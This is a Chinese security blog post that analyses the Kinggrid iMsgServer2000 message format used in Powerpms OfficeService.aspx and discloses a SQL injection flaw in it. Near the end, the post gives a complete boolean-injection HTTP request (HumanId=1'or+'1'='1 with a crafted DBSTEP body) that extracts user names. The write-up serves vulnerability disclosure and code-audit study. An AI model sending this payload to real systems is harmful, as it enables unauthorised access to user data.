---
title: "普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞"
source: https://mrxn.net/jswz/powerplat-FormXml-DocFile-OfficeService-sqli.html
---

# 普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/28 08:16
* 831浏览
* [2评论](#comment)
* 1小时
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

在页面初始位置就加载了

```
protected void Page_Load(object sender, EventArgs e)
{
  PowerGlobal.CheckSecurity(this.Request);
  iMsgServer2000 iMsgServer2000 = new iMsgServer2000();
```

iMsgServer2000 非常熟悉的金格组件标志,之前在java相关应用上分析过java版本的,跟进看下C#版本的有啥不一样

![普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](https://image.mrxn.net/088d176415a04208aea7e6243becf996.webp)

定义一些默认常量,再往下看

```
public iMsgServer2000()
{
  this.FMsgText = "";
  this.FError = "";
  this.FVersion = this.VERSION;
  try
  {
    this.FTempName = Path.GetTempFileName();
    this.FMsgFile = new FileStream(this.FTempName, (FileMode) 4);
  }
  catch
  {
  }
  this.Charset = "GB2312";
}

~iMsgServer2000()
{
  try
  {
    ((Stream) this.FMsgFile).Close();
    if (string.Compare(this.FMsgFile.Name, this.FTempName) != 0)
      return;
    this.DelFile(this.FTempName);
  }
  catch
  {
  }
  finally
  {
    base.Finalize();
  }
}

private string FormatHead(string vString)
{
  if (vString.Length > 16 /*0x10*/)
    return vString.Substring(0, 16 /*0x10*/);
  for (int index = vString.Length + 1; index < 17; ++index)
    vString += " ";
  return vString;
}
```

定义了消息头的格式化方式,如果超过16字节就截取前16字节.

再看下剩下的消息格式

```
private byte[] MsgToStream(byte[] mStream)
{
  int num1 = 64 /*0x40*/;
  int num2 = 0;
  int length1 = 1024 /*0x0400*/ * this.BuffSize;
  byte[] numArray = new byte[length1];
  try
  {
    int num3 = 0;
    int length2 = this.StringToByte(this.FMsgText).GetLength(0);
    int length3 = this.StringToByte(this.FError).GetLength(0);
    this.FFileSize = (int) ((Stream) this.FMsgFile).Length;
    int ffileSize = this.FFileSize;
    mStream = new byte[num1 + length2 + length3 + ffileSize];
    MemoryStream memoryStream = new MemoryStream(mStream);
    string vString = this.FormatHead(this.FVersion) + this.FormatHead(length2.ToString()) + this.FormatHead(length3.ToString()) + this.FormatHead(ffileSize.ToString());
    ((Stream) memoryStream).Write(this.StringToByte(vString), 0, num1);
    int num4 = num3 + num1;
    if (length2 > 0)
      ((Stream) memoryStream).Write(this.StringToByte(this.FMsgText), 0, length2);
    int num5 = num4 + length2;
    if (length3 > 0)
      ((Stream) memoryStream).Write(this.StringToByte(this.FError), 0, length3);
    int num6 = num5 + length3;
    if (ffileSize > 0)
    {
      ((Stream) this.FMsgFile).Seek(0L, (SeekOrigin) 0);
      int length4 = length1;
      for (; ffileSize > 0; ffileSize -= length4)
      {
        if (ffileSize - length1 < length1)
        {
          length4 = ffileSize;
          numArray = new byte[length4];
        }
        int num7 = 0;
        while (num7 < length4)
          num7 += ((Stream) this.FMsgFile).Read(numArray, num7, length4 - num7);
        ((Stream) memoryStream).Write(numArray, 0, length4);
      }
    }
    num2 = num6 + ffileSize;
    ((Stream) memoryStream).Close();
    return mStream;
  }
  catch (Exception ex)
  {
    this.FError += ex.ToString();
    return (byte[]) null;
  }
}
```

其中vString的定义消息头的组成部分由四个部分组成（版本、消息文本、错误信息、文件内容）:

* 整个
  `mStream`
  的结构：头部（64字节） + 消息文本（length2字节） + 错误信息（length3字节） + 文件内容（ffileSize字节）。

1. **第一部分：this.FormatHead(this.FVersion)**
   1. **来源**
      ：
      `this.FVersion`
      ，这是类的版本字符串，默认值为
      `"DBSTEP V3.0"`
      （在类中定义为
      `private string VERSION = "DBSTEP V3.0";`
      并在构造函数中赋值
      `this.FVersion = this.VERSION;`
      ）。
   2. **处理**
      ：通过
      `FormatHead`
      格式化为正好16字符。
      * 原字符串长度：11（"DBSTEP V3.0"）。
      * 格式化后：
        `"DBSTEP V3.0 "`
        （末尾补5个空格，使总长16）。
   3. **作用**
      ：表示消息的版本信息，用于接收端验证兼容性。
   4. **长度**
      ：固定16字符。
2. **第二部分：this.FormatHead(length2.ToString())**
   1. **来源**
      ：
      `length2`
      ，这是
      `FMsgText`
      （消息文本）的字节长度。
      * `FMsgText`
        是类的私有字段，默认空字符串（构造函数中
        `this.FMsgText = "";`
        ）。
      * `length2 = this.StringToByte(this.FMsgText).GetLength(0);`
        ：将
        `FMsgText`
        转换为字节数组，并获取其长度（取决于编码，如GB2312）。
      * 示例：如果
        `FMsgText`
        为空，
        `length2 = 0`
        ，则
        `length2.ToString() = "0"`
        。
   2. **处理**
      ：通过
      `FormatHead`
      格式化为正好16字符。
      * 示例：如果
        `length2 = 0`
        ，格式化后：
        `"0 "`
        （补15个空格）。
      * 如果
        `length2 = 1024`
        ，则
        `"1024 "`
        （补12个空格）。
   3. **作用**
      ：表示后续消息文本的字节长度，便于接收端读取正确的数据块。
   4. **长度**
      ：固定16字符。
3. **第三部分：this.FormatHead(length3.ToString())**
   1. **来源**
      ：
      `length3`
      ，这是
      `FError`
      （错误信息）的字节长度。
      * `FError`
        是类的私有字段，默认空字符串（构造函数中
        `this.FError = "";`
        ）。
      * `length3 = this.StringToByte(this.FError).GetLength(0);`
        ：类似
        `length2`
        ，转换为字节后获取长度。
      * 示例：如果无错误，
        `length3 = 0`
        ，则
        `"0"`
        。
   2. **处理**
      ：通过
      `FormatHead`
      格式化为正好16字符。
      * 示例：
        `"0 "`
        （补15个空格）。
   3. **作用**
      ：表示后续错误信息的字节长度。如果有错误，接收端可以读取并处理。
   4. **长度**
      ：固定16字符。
4. **第四部分：this.FormatHead(ffileSize.ToString())**
   1. **来源**
      ：
      `ffileSize`
      ，这是文件内容的字节大小。
      * `this.FFileSize = (int) ((Stream) this.FMsgFile).Length;`
        ：从文件流
        `FMsgFile`
        （临时文件）获取大小。
      * `ffileSize = this.FFileSize;`
        ：复制值。
      * 示例：如果文件为空，
        `ffileSize = 0`
        。
   2. **处理**
      ：通过
      `FormatHead`
      格式化为正好16字符。
      * 示例：如果
        `ffileSize = 0`
        ，格式化后：
        `"0 "`
        。
      * 如果
        `ffileSize = 2048`
        ，则
        `"2048 "`
        。
   3. **作用**
      ：表示后续文件内容的字节长度，便于接收端读取文件数据块。
   4. **长度**
      ：固定16字符。

示例如下

```
DBSTEP V3.0     10              0               1024
```

代表版本为系统默认的 DBSTEP V3.0+补充空格,一共16字节,余下每个部分亦如此,不再赘述.

再看下 iMsgServer2000.GetMsgByName 的实现

```
public string GetMsgByName(string FieldName)
{
  string msgByName = "";
  string str = FieldName + "=";
  int num1 = this.FMsgText.IndexOf(str);
  if (num1 == -1)
    return msgByName;
  int num2 = this.FMsgText.IndexOf("\r\n", num1 + 1);
  int num3 = num1 + str.Length;
  return num2 != -1 ? this.DecodeBase64(this.FMsgText.Substring(num3, num2 - num3)) : msgByName;
}
```

根据 FieldName 的值加上=后截取等号后至换行之间的内容作为值.

只需要注意其中第二部分的消息长度是计算消息头64字节之后到文件内容之前的部分长度,最后部分的文件长度需要加上消息的结尾的换行长度2.

举例如下图

![普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](https://image.mrxn.net/362589d703fa42419fd8a9837264dfb4.webp)

其中135代表消息长度,由以下部分组成

![普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](https://image.mrxn.net/c7ebd1e176834d6fa2b60d3fcf3f56d8.webp)

换行的 123456 代表文件内容,其长度也是消息头的第四部分,即上图中的 8(文件内容本身长度6+上一部分的换行长度2)

再看下响应的部分

![普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](https://image.mrxn.net/98c13e5b78a44eeb92c7227709b70d31.webp)

消息校验成功,输出也符合代码逻辑,响应里设置 MARKLIST 的值为 LoadMarkList 方法的结果

![普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](https://image.mrxn.net/d6dfddbff73c4c44b2d87d6f5e019343.webp)

再跟进 LoadMarkList 方法

```
private string LoadMarkList(string user_id)
{
  StringBuilder stringBuilder = new StringBuilder();
  try
  {
    IBusinessOperate businessOperate = BusinessFactory.CreateBusinessOperate("HumanSign");
    if (string.IsNullOrEmpty(user_id))
      user_id = Guid.Empty.ToString();
    foreach (IBaseBusiness baseBusiness in (IEnumerable<IBaseBusiness>) businessOperate.FindAll("HumanId", (object) user_id))
    {
```

又是熟悉的 FindAll 方法,是存在SQL注入的,但是此处因为开头有 PowerGlobal.CheckSecurity 的校验

![普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](https://image.mrxn.net/edc17a0bb9de4107a7c13f6b46ef99a2.webp)

会检查是否存在
[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
的一些特征

![普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](https://image.mrxn.net/18dc23365d2e47508a8f53cbf1eec2a0.webp)

在看下 CheckSortSelect 方法

![普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](https://image.mrxn.net/dae32034fecb4088b028fd581fa5a0fe.webp)

跟进 CheckWhere 方法

![普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](https://image.mrxn.net/49be882c64ab416e9992b7f6c4f657a2.webp)

检测where语句后是否存在 一些特征,当存在时字节返回
`包含非法字符 --`
这种格式

如下图所示

![普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](https://image.mrxn.net/b3afd58ddc374e87b7f007fdeb7cd78a.webp)

那我们直接可以构造布尔
[注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
达到获取数据的目的

```
POST /PowerPlat/FormXml/DocFile/OfficeService.aspx?HumanId=1'or+'1'='1 HTTP/1.1
Host: powerplat.mrxn.net
Content-Type: application/x-www-form-urlencoded

DBSTEP V3.0     135             0               8               DBSTEP=REJTVEVQ
OPTION=TE9BRE1BUktMSVNU
USERNAME=YWRtaW4=
TEMPLATE=dGVzdC50eHQ=
FILENAME=dGVzdC50eHQ=
RECORDID=dHh0
FILETYPE=dHh0
123456
```

![普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](https://image.mrxn.net/bbfaa1625fee491b967e8c145bbe2a8f.webp)

对响应的
**MARKLIST**
的值进行
**base64**
解码

是可以获取到所有相关用户名

![普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](https://image.mrxn.net/fdf42f27acad4e719fc7b441c675cf77.webp)

* 标签：
* [#
  漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#
  SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#
  代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#
  0day](https://mrxn.net/tag/0day)
* [#
  asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](https://mrxn.net/jswz/powerplat-FormXml-DocFile-OfficeService-sqli.html)
  
文章链接：
<https://mrxn.net/jswz/powerplat-FormXml-DocFile-OfficeService-sqli.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/powerplat-FormXml-DocFile-OfficeService-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/powerplat-FormXml-DocFile-OfficeService-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});